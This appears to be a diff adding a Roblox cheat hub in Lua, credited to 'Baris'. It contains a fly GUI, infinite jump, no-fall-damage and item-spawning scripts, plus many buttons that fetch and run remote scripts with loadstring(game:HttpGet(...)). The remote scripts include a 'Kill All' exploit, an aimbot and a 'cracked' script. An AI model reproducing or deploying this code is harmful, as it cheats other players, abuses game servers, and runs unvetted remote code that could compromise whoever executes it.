+speed.BackgroundColor3 = Color3.fromRGB(255, 85, 0)
+speed.Position = UDim2.new(0.468421042, 0, 0.491228074, 0)
+speed.Size = UDim2.new(0, 44, 0, 28)
+speed.Font = Enum.Font.SourceSans
+speed.Text = "1"
+speed.TextColor3 = Color3.fromRGB(0, 0, 0)
+speed.TextScaled = true
+speed.TextSize = 14.000
+speed.TextWrapped = true
+
+mine.Name = "mine"
+mine.Parent = Frame
+mine.BackgroundColor3 = Color3.fromRGB(123, 255, 247)
+mine.Position = UDim2.new(0.231578946, 0, 0.491228074, 0)
+mine.Size = UDim2.new(0, 45, 0, 29)
+mine.Font = Enum.Font.SourceSans
+mine.Text = "-"
+mine.TextColor3 = Color3.fromRGB(0, 0, 0)
+mine.TextScaled = true
+mine.TextSize = 14.000
+mine.TextWrapped = true
+
+closebutton.Name = "Close"
+closebutton.Parent = main.Frame
+closebutton.BackgroundColor3 = Color3.fromRGB(225, 25, 0)
+closebutton.Font = "SourceSans"
+closebutton.Size = UDim2.new(0, 45, 0, 28)
+closebutton.Text = "X"
+closebutton.TextSize = 30
+closebutton.Position =  UDim2.new(0, 0, -1, 27)
+
+mini.Name = "minimize"
+mini.Parent = main.Frame
+mini.BackgroundColor3 = Color3.fromRGB(192, 150, 230)
+mini.Font = "SourceSans"
+mini.Size = UDim2.new(0, 45, 0, 28)
+mini.Text = "-"
+mini.TextSize = 40
+mini.Position = UDim2.new(0, 44, -1, 27)
+
+mini2.Name = "minimize2"
+mini2.Parent = main.Frame
+mini2.BackgroundColor3 = Color3.fromRGB(192, 150, 230)
+mini2.Font = "SourceSans"
+mini2.Size = UDim2.new(0, 45, 0, 28)
+mini2.Text = "+"
+mini2.TextSize = 40
+mini2.Position = UDim2.new(0, 44, -1, 57)
+mini2.Visible = false
+
+speeds = 1
+
+local speaker = game:GetService("Players").LocalPlayer
+
+local chr = game.Players.LocalPlayer.Character
+local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
+
+nowe = false
+
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+	Title = "FLY GUI V3 BY BARIS";
+	Text = "BY  BARIS";
+	Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
+Duration = 5;
+
+Frame.Active = true -- main = gui
+Frame.Draggable = true
+
+onof.MouseButton1Down:connect(function()
+
+	if nowe == true then
+		nowe = false
+
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,true)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,true)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,true)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,true)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,true)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,true)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,true)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,true)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,true)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,true)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,true)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,true)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,true)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,true)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,true)
+		speaker.Character.Humanoid:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)
+	else 
+		nowe = true
+
+
+
+		for i = 1, speeds do
+			spawn(function()
+
+				local hb = game:GetService("RunService").Heartbeat	
+
+
+				tpwalking = true
+				local chr = game.Players.LocalPlayer.Character
+				local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
+				while tpwalking and hb:Wait() and chr and hum and hum.Parent do
+					if hum.MoveDirection.Magnitude > 0 then
+						chr:TranslateBy(hum.MoveDirection)
+					end
+				end
+
+			end)
+		end
+		game.Players.LocalPlayer.Character.Animate.Disabled = true
+		local Char = game.Players.LocalPlayer.Character
+		local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")
+
+		for i,v in next, Hum:GetPlayingAnimationTracks() do
+			v:AdjustSpeed(0)
+		end
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,false)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,false)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,false)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,false)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,false)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,false)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,false)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,false)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,false)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,false)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,false)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,false)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,false)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,false)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,false)
+		speaker.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Swimming)
+	end
+
+
+
+
+	if game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid").RigType == Enum.HumanoidRigType.R6 then
+
+
+
+		local plr = game.Players.LocalPlayer
+		local torso = plr.Character.Torso
+		local flying = true
+		local deb = true
+		local ctrl = {f = 0, b = 0, l = 0, r = 0}
+		local lastctrl = {f = 0, b = 0, l = 0, r = 0}
+		local maxspeed = 50
+		local speed = 0
+
+
+		local bg = Instance.new("BodyGyro", torso)
+		bg.P = 9e4
+		bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
+		bg.cframe = torso.CFrame
+		local bv = Instance.new("BodyVelocity", torso)
+		bv.velocity = Vector3.new(0,0.1,0)
+		bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
+		if nowe == true then
+			plr.Character.Humanoid.PlatformStand = true
+		end
+		while nowe == true or game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0 do
+			game:GetService("RunService").RenderStepped:Wait()
+
+			if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
+				speed = speed+.5+(speed/maxspeed)
+				if speed > maxspeed then
+					speed = maxspeed
+				end
+			elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
+				speed = speed-1
+				if speed < 0 then
+					speed = 0
+				end
+			end
+			if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
+				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
+				lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
+			elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
+				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
+			else
+				bv.velocity = Vector3.new(0,0,0)
+			end
+			--	game.Players.LocalPlayer.Character.Animate.Disabled = true
+			bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
+		end
+		ctrl = {f = 0, b = 0, l = 0, r = 0}
+		lastctrl = {f = 0, b = 0, l = 0, r = 0}
+		speed = 0
+		bg:Destroy()
+		bv:Destroy()
+		plr.Character.Humanoid.PlatformStand = false
+		game.Players.LocalPlayer.Character.Animate.Disabled = false
+		tpwalking = false
+
+
+
+
+	else
+		local plr = game.Players.LocalPlayer
+		local UpperTorso = plr.Character.UpperTorso
+		local flying = true
+		local deb = true
+		local ctrl = {f = 0, b = 0, l = 0, r = 0}
+		local lastctrl = {f = 0, b = 0, l = 0, r = 0}
+		local maxspeed = 50
+		local speed = 0
+
+
+		local bg = Instance.new("BodyGyro", UpperTorso)
+		bg.P = 9e4
+		bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
+		bg.cframe = UpperTorso.CFrame
+		local bv = Instance.new("BodyVelocity", UpperTorso)
+		bv.velocity = Vector3.new(0,0.1,0)
+		bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
+		if nowe == true then
+			plr.Character.Humanoid.PlatformStand = true
+		end
+		while nowe == true or game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0 do
+			wait()
+
+			if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
+				speed = speed+.5+(speed/maxspeed)
+				if speed > maxspeed then
+					speed = maxspeed
+				end
+			elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
+				speed = speed-1
+				if speed < 0 then
+					speed = 0
+				end
+			end
+			if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
+				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
+				lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
+			elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
+				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
+			else
+				bv.velocity = Vector3.new(0,0,0)
+			end
+
+			bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
+		end
+		ctrl = {f = 0, b = 0, l = 0, r = 0}
+		lastctrl = {f = 0, b = 0, l = 0, r = 0}
+		speed = 0
+		bg:Destroy()
+		bv:Destroy()
+		plr.Character.Humanoid.PlatformStand = false
+		game.Players.LocalPlayer.Character.Animate.Disabled = false
+		tpwalking = false
+
+
+
+	end
+
+
+
+
+
+end)
+
+local tis
+
+up.MouseButton1Down:connect(function()
+	tis = up.MouseEnter:connect(function()
+		while tis do
+			wait()
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,1,0)
+		end
+	end)
+end)
+
+up.MouseLeave:connect(function()
+	if tis then
+		tis:Disconnect()
+		tis = nil
+	end
+end)
+
+local dis
+
+down.MouseButton1Down:connect(function()
+	dis = down.MouseEnter:connect(function()
+		while dis do
+			wait()
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,-1,0)
+		end
+	end)
+end)
+
+down.MouseLeave:connect(function()
+	if dis then
+		dis:Disconnect()
+		dis = nil
+	end
+end)
+
+
+game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(char)
+	wait(0.7)
+	game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
+	game.Players.LocalPlayer.Character.Animate.Disabled = false
+
+end)
+
+
+plus.MouseButton1Down:connect(function()
+	speeds = speeds + 1
+	speed.Text = speeds
+	if nowe == true then
+
+
+		tpwalking = false
+		for i = 1, speeds do
+			spawn(function()
+
+				local hb = game:GetService("RunService").Heartbeat	
+
+
+				tpwalking = true
+				local chr = game.Players.LocalPlayer.Character
+				local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
+				while tpwalking and hb:Wait() and chr and hum and hum.Parent do
+					if hum.MoveDirection.Magnitude > 0 then
+						chr:TranslateBy(hum.MoveDirection)
+					end
+				end
+
+			end)
+		end
+	end
+end)
+mine.MouseButton1Down:connect(function()
+	if speeds == 1 then
+		speed.Text = 'cannot be less than 1'
+		wait(1)
+		speed.Text = speeds
+	else
+		speeds = speeds - 1
+		speed.Text = speeds
+		if nowe == true then
+			tpwalking = false
+			for i = 1, speeds do
+				spawn(function()
+
+					local hb = game:GetService("RunService").Heartbeat	
+
+
+					tpwalking = true
+					local chr = game.Players.LocalPlayer.Character
+					local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
+					while tpwalking and hb:Wait() and chr and hum and hum.Parent do
+						if hum.MoveDirection.Magnitude > 0 then
+							chr:TranslateBy(hum.MoveDirection)
+						end
+					end
+
+				end)
+			end
+		end
+	end
+end)
+
+closebutton.MouseButton1Click:Connect(function()
+	main:Destroy()
+end)
+
+mini.MouseButton1Click:Connect(function()
+	up.Visible = false
+	down.Visible = false
+	onof.Visible = false
+	plus.Visible = false
+	speed.Visible = false
+	mine.Visible = false
+	mini.Visible = false
+	mini2.Visible = true
+	main.Frame.BackgroundTransparency = 1
+	closebutton.Position =  UDim2.new(0, 0, -1, 57)
+end)
+
+mini2.MouseButton1Click:Connect(function()
+	up.Visible = true
+	down.Visible = true
+	onof.Visible = true
+	plus.Visible = true
+	speed.Visible = true
+	mine.Visible = true
+	mini.Visible = true
+	mini2.Visible = false
+	main.Frame.BackgroundTransparency = 0 
+	closebutton.Position =  UDim2.new(0, 0, -1, 27)
+end)
+end)
+
+MainSection:NewButton("Free Camera!", "ButtonInfo", function()
+    loadstring(game:HttpGet('https://zxfolix.github.io/freecamV2.txt'))()
+end)
+
+local Main = Window:NewTab("Game Scripts")
+
+local MainSection = Main:NewSection("Bloxfruit Scripts")
+
+MainSection:NewButton("Bloxfruit Script 1", "ButtonInfo", function()
+    loadstring(game:HttpGet"https://raw.githubusercontent.com/Basicallyy/Basicallyy/main/MinGamingV4.lua")()
+end)
+
+MainSection:NewButton("Bloxfruit Script 2", "ButtonInfo", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Yatsuraa/Yuri/main/Winterhub_V2.lua"))()
+end)
+
+local MainSection = Main:NewSection("Fortline")
+
+MainSection:NewButton("Kill All (OP)", "ButtonInfo", function()
+loadstring(game:HttpGet("https://gist.githubusercontent.com/ExploiterGuy/4d95c83a854d6e7265a43094219d0b00/raw/8bc8d511803b2e5b2a1b6abe70c6e1c994601323/%255B%25F0%259F%2594%25AB%255D%2520Fortline"))()
+end)
+
+local MainSection = Main:NewSection("Lucky Blocks")
+
+MainSection:NewButton("Script1", "ButtonInfo", function()
+    -- Roblox Script: Button GUI for Spawning Blocks
+
+-- Check if GUI is already active
+if game.Players.LocalPlayer:FindFirstChild("PlayerGui"):FindFirstChild("SpawnBlocksGui") then
+    game.Players.LocalPlayer.PlayerGui:FindFirstChild("SpawnBlocksGui"):Destroy()
+end
+
+-- Create the ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "SpawnBlocksGui"
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Display "MADE BY BARIS" with changing colors
+local label = Instance.new("TextLabel")
+label.Size = UDim2.new(0, 400, 0, 100)
+label.Position = UDim2.new(0.5, -200, 0.5, -50)
+label.BackgroundTransparency = 1
+label.TextScaled = true
+label.Font = Enum.Font.SourceSansBold
+label.Text = "MADE BY BARIS"
+label.Parent = screenGui
+
+local colors = {Color3.new(1, 0, 0), Color3.new(0, 1, 0), Color3.new(0, 0, 1), Color3.new(1, 1, 0), Color3.new(1, 0, 1), Color3.new(0, 1, 1)}
+for i = 1, 20 do
+    label.TextColor3 = colors[(i - 1) % #colors + 1]
+    task.wait(0.1)
+end
+label:Destroy()
+
+-- Create a Frame for the buttons
+local buttonFrame = Instance.new("Frame")
+buttonFrame.Size = UDim2.new(0, 250, 0, 400)
+buttonFrame.Position = UDim2.new(1, -260, 0, 10) -- Position at the top-right corner of the screen
+buttonFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+buttonFrame.BorderSizePixel = 0
+buttonFrame.Active = true
+buttonFrame.Draggable = true
+buttonFrame.Parent = screenGui
+
+-- Create a Title Label
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(1, 0, 0, 30)
+titleLabel.Position = UDim2.new(0, 0, 0, 0)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Text = "Spawn Blocks"
+titleLabel.TextColor3 = Color3.new(1, 1, 1)
+titleLabel.Font = Enum.Font.SourceSansBold
+titleLabel.TextSize = 20
+titleLabel.Parent = buttonFrame
+
+-- Create Close (X) Button
+local closeButton = Instance.new("TextButton")
+closeButton.Size = UDim2.new(0, 30, 0, 30)
+closeButton.Position = UDim2.new(1, -35, 0, 5)
+closeButton.Text = "X"
+closeButton.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
+closeButton.TextColor3 = Color3.new(1, 1, 1)
+closeButton.Font = Enum.Font.SourceSansBold
+closeButton.TextSize = 18
+closeButton.Parent = buttonFrame
+closeButton.MouseButton1Click:Connect(function()
+    screenGui:Destroy()
+end)
+
+-- Create Minimize (-) Button
+local minimizeButton = Instance.new("TextButton")
+minimizeButton.Size = UDim2.new(0, 30, 0, 30)
+minimizeButton.Position = UDim2.new(1, -70, 0, 5)
+minimizeButton.Text = "-"
+minimizeButton.BackgroundColor3 = Color3.new(0.2, 0.6, 0.8)
+minimizeButton.TextColor3 = Color3.new(1, 1, 1)
+minimizeButton.Font = Enum.Font.SourceSansBold
+minimizeButton.TextSize = 18
+minimizeButton.Parent = buttonFrame
+
+local isMinimized = false
+local buttonElements = {} -- Store button elements to toggle visibility
+local inputElements = {} -- Store input elements to toggle visibility
+
+local function toggleVisibility(visible)
+    for _, button in ipairs(buttonElements) do
+        button.Visible = visible
+    end
+    for _, input in ipairs(inputElements) do
+        input.Visible = visible
+    end
+end
+
+minimizeButton.MouseButton1Click:Connect(function()
+    isMinimized = not isMinimized
+    buttonFrame.Size = isMinimized and UDim2.new(0, 250, 0, 40) or UDim2.new(0, 250, 0, 400)
+    toggleVisibility(not isMinimized)
+end)
+
+-- Create an input box for the repeat count
+local inputBox = Instance.new("TextBox")
+inputBox.Size = UDim2.new(0, 200, 0, 40)
+inputBox.Position = UDim2.new(0, 25, 0, 350)
+inputBox.PlaceholderText = "Enter repeat count"
+inputBox.Text = ""
+inputBox.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+inputBox.TextColor3 = Color3.new(1, 1, 1)
+inputBox.Font = Enum.Font.SourceSansBold
+inputBox.TextSize = 18
+inputBox.Parent = buttonFrame
+
+table.insert(inputElements, inputBox) -- Add input box to the toggle list
+
+-- Function to create buttons
+local function createButton(parent, text, position, onClick)
+    local button = Instance.new("TextButton")
+    button.Size = UDim2.new(0, 200, 0, 50)
+    button.Position = position
+    button.Text = text
+    button.BackgroundColor3 = Color3.new(0.2, 0.6, 0.8)
+    button.TextColor3 = Color3.new(1, 1, 1)
+    button.Font = Enum.Font.SourceSansBold
+    button.TextSize = 24
+    button.Parent = parent
+
+    table.insert(buttonElements, button) -- Add button to the toggle list
+
+    button.MouseButton1Click:Connect(function()
+        local repeatCount = tonumber(inputBox.Text) or 1
+        for i = 1, repeatCount do
+            onClick()
+            if i % 10 == 0 then
+                task.wait() -- Prevent freezing by yielding every 10 iterations
+            end
+        end
+    end)
+end
+
+-- Create Buttons
+createButton(buttonFrame, "Spawn Lucky Block", UDim2.new(0, 25, 0, 50), function()
+    game.ReplicatedStorage.SpawnLuckyBlock:FireServer()
+end)
+
+createButton(buttonFrame, "Spawn Super Block", UDim2.new(0, 25, 0, 110), function()
+    game.ReplicatedStorage.SpawnSuperBlock:FireServer()
+end)
+
+createButton(buttonFrame, "Spawn Rainbow Block", UDim2.new(0, 25, 0, 170), function()
+    game.ReplicatedStorage.SpawnRainbowBlock:FireServer()
+end)
+
+createButton(buttonFrame, "Spawn Galaxy Block", UDim2.new(0, 25, 0, 230), function()
+    game.ReplicatedStorage.SpawnGalaxyBlock:FireServer()
+end)
+
+createButton(buttonFrame, "Spawn Void Block", UDim2.new(0, 25, 0, 290), function()
+    game.ReplicatedStorage.SpawnRainbowBlock:FireServer()
+    game.ReplicatedStorage.SpawnGalaxyBlock:FireServer()
+    game.ReplicatedStorage.SpawnRainbowBlock:FireServer()
+    game.ReplicatedStorage.SpawnGalaxyBlock:FireServer()
+    game.ReplicatedStorage.SpawnRainbowBlock:FireServer()
+    game.ReplicatedStorage.SpawnGalaxyBlock:FireServer()
+end)
+
+end)
+
+local MainSection = Main:NewSection("FISCH")
+
+MainSection:NewButton("Script1!", "ButtonInfo", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AyoReaper/Reaper-Hub/refs/heads/main/fisch.lua"))()
+end)
+
+local MainSection = Main:NewSection("PETSGO!")
+
+MainSection:NewButton("Script1!", "ButtonInfo", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AyoReaper/Reaper-Hub/refs/heads/main/PETSGO!.lua"))()
+end)
+
+local MainSection = Main:NewSection("PS99!")
+
+MainSection:NewButton("Script1!", "ButtonInfo", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AyoReaper/Reaper-Hub/refs/heads/main/PetSimulator99.lua"))()
+end)
+
+local MainSection = Main:NewSection("[BEST] Counter Blox")
+
+MainSection:NewButton("CLİCK ME!", "ButtonInfo", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ttwizz/Open-Aimbot/master/source.lua", true))() 
+end)
+
+local MainSection = Main:NewSection("Natural Disaster Scripts")
+
+
+MainSection:NewButton("No Fall Damage (CLICK ME)", "ButtonInfo", function()
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "No Fall Damage",
+            Text = "No Fall Damage Activited!",
+            Duration = 5,
+        })
+
+local k_ = game:GetService("Players")
+local fk = k_.LocalPlayer
+
+local function k()
+    local et
+
+    local function o(d)
+        local cet = d:WaitForChild("HumanoidRootPart")
+        if cet then
+            et = game:GetService("RunService").Heartbeat:Connect(function()
+                if not cet.Parent then et:Disconnect() end
+                local pce = cet.AssemblyLinearVelocity
+                cet.AssemblyLinearVelocity = Vector3.zero
+                game:GetService("RunService").RenderStepped:Wait()
+                cet.AssemblyLinearVelocity = pce
+            end)
+        end
+    end
+
+    local rpc = fk.Character
+    if rpc then o(rpc) end
+
+    fk.CharacterAdded:Connect(function(_)
+        if et then et:Disconnect() end
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "DistiC",
+            Text = "No Fall Damage aktif!",
+            Duration = 5,
+        })
+    end)
+end
+
+k()
+fk.CharacterAdded:Connect(function(_)
+    k()
+end)
+
+end)
+
+MainSection:NewButton("Infinite Jump! (First Open No Fall Damage)", "ButtonInfo", function()
+local player = game.Players.LocalPlayer
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = player:WaitForChild("PlayerGui")
+screenGui.ResetOnSpawn = false  -- GUI'nin spawn olduğunda kaybolmamasını sağlıyor
+
+local TweenService = game:GetService("TweenService")
+
+-- Buton oluşturma (Eski boyut: 200x50)
+local button = Instance.new("TextButton")
+button.Size = UDim2.new(0, 200, 0, 50)
+button.Position = UDim2.new(0.5, -100, 0, 50)
+button.Text = "Open Infinite Jump"
+button.BackgroundTransparency = 0.5  -- Yarı şeffaf buton
+button.TextColor3 = Color3.fromRGB(255, 255, 255)  -- Yazı rengi beyaz
+button.TextSize = 20
+button.Parent = screenGui
+
+-- "By Baris" etiketi oluşturma
+local label = Instance.new("TextLabel")
+label.Size = UDim2.new(0, 200, 0, 30)
+label.Position = UDim2.new(0, 0, 1, 5)  -- Butonun altına 5 piksel boşlukla yerleştirildi
+label.Text = "By Baris"
+label.TextSize = 20
+label.Font = Enum.Font.SourceSansBold
+label.BackgroundTransparency = 0.3  -- Hafif şeffaf arka plan
+label.TextColor3 = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255))  -- Rastgele RGB renk
+label.Parent = button
+
+-- "By Baris" yazısının RGB rengini hızla değiştirme
+spawn(function()
+    while true do
+        label.TextColor3 = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255))
+        wait(0.1)  -- Daha hızlı RGB değişimi (0.1 saniyede bir)
+    end
+end)
+
+-- GUI'nin sürüklenebilir olması (Daha akıcı sürükleme için Tween ekledik)
+local dragging = false
+local dragStart = nil
+local startPos = nil
+
+button.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        dragStart = input.Position
+        startPos = button.Position
+    end
+end)
+
+button.InputChanged:Connect(function(input)
+    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+        local delta = input.Position - dragStart
+        local newPosition = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+
+        -- Tweening ile akıcı hareket sağlıyoruz
+        local tweenInfo = TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+        local tween = TweenService:Create(button, tweenInfo, {Position = newPosition})
+        tween:Play()
+    end
+end)
+
+button.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = false
+    end
+end)
+
+-- Infinite Jump fonksiyonu
+local InfiniteJumpEnabled = false
+local function toggleInfiniteJump()
+    InfiniteJumpEnabled = not InfiniteJumpEnabled
+    if InfiniteJumpEnabled then
+        button.Text = "Close Infinite Jump"
+    else
+        button.Text = "Open Infinite Jump"
+    end
+end
+
+game:GetService("UserInputService").JumpRequest:Connect(function()
+    if InfiniteJumpEnabled then
+        game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping")
+    end
+end)
+
+-- Butona tıklama olayı
+button.MouseButton1Click:Connect(function()
+    toggleInfiniteJump()  -- Infinite Jump'ı açma/kapatma
+end)
+end)
+
+MainSection:NewButton("Get Green Balloon (Works Some Times)", "ButtonInfo", function()
+--BALON
+
+local function getBalloon()
+    local function notify(title, text, duration)
+        game.StarterGui:SetCore("SendNotification", {
+            Title = title;
+            Text = text;
+            Duration = duration;
+        })
+    end
+
+    local balloon = game.Workspace:FindFirstChild("GreenBalloon", true)
+    if balloon then
+        local clonedBalloon = balloon:Clone()
+        clonedBalloon.Parent = game:GetService("Players").LocalPlayer.Backpack
+        notify("Success", "Copied Someones Balloon To Your Backpack!", 5)
+    else
+        notify("Try Again Later", "No One Has Blloon On The Server", 5)
+    end
+end
+
+-- Alternatif tetikleme yöntemi burada belirlenebilir
+getBalloon()
+end)
+
+
+MainSection:NewButton("CH Hub", "ButtonInfo", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxHackingProject/CHHub/main/CHHub.lua"))()
+end)
+
+MainSection:NewButton("(OP) Super Ring Parts V5", "ButtonInfo", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/mB0mf6VF"))()
+end)
+
+MainSection:NewButton("(OP) Super Ring Parts V4", "ButtonInfo", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/z466kRBQ"))()
+end)
+
+MainSection:NewButton("(OP) Super Ring Parts V3", "ButtonInfo", function()
+   -- Services
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+-- Get LocalPlayer
+local LocalPlayer = Players.LocalPlayer
+
+-- Chat message function
+local function SendChatMessage(message)
+    if game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.TextChatService then
+        -- New Chat System
+        local textChannel = game:GetService("TextChatService").TextChannels.RBXGeneral
+        if textChannel then
+            textChannel:SendAsync(message)
+        else
+            warn("Chat channel not found!")
+        end
+    else
+        -- Legacy Chat System
+        local chatEvent = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
+        chatEvent:FireServer(message, "All")
+    end
+end
+
+-- Send the message
+SendChatMessage("Super Ring Parts V3 Cracked By bok31_31mal 🎉")
+
+
+
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local SoundService = game:GetService("SoundService")
+local StarterGui = game:GetService("StarterGui")
+local TextChatService = game:GetService("TextChatService")
+
+local LocalPlayer = Players.LocalPlayer
+
+-- Sound Effects
+local function playSound(soundId)
+    local sound = Instance.new("Sound")
+    sound.SoundId = "rbxassetid://" .. soundId
+    sound.Parent = SoundService
+    sound:Play()
+    sound.Ended:Connect(function()
+        sound:Destroy()
+    end)
+end
+
